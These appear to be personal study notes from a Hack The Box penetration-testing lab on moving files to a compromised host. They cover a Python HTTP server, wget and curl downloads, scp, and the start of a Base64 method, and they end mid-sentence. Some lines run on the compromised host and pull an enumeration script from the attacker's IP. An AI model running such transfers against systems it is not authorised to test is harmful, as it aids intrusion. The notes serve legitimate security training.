- During a penetration test we will need to transfer files to the remote server such as enumeration scripts or exploits of course we can use the other shells and tools like metasploit and meterpeter learning methods to transfer files in reverse shell is needed

## Using wget 
-  Many methods are used to do this one method is running a Python HTTP sever on our machine and  then use wget or cURL to download the file on our remote host.  
- First we need to go into the dierctory we can find the file then we transfer and run the Python HTTP server in it
```shell-session
00818@htb[/htb]$ cd /tmp
00818@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Now that a listening server is set up on our machine we can download the file on the remote host that we have a code execution on

```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

-  Now that we used our IPs to set up our Python sever on port 8000
- In case the server doesn't have a wget you can use cURL instead to download the file
```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```
- Note the -o flag was used to specify the output file name

## Using SCP 
- ANother method to tranfer files is the scp method however we need ssh user credentials on the remote host like as follow>>

```shell-session
00818@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

- The directory and the file name was placed after the scp command using the :

## Using Base64
-  In some cases transferrign files may not be available to us since the firewall prptrections would prevent us from downloading it from our machine 
- in this situation we use base64
- we would do that by encode the file into base 64 format-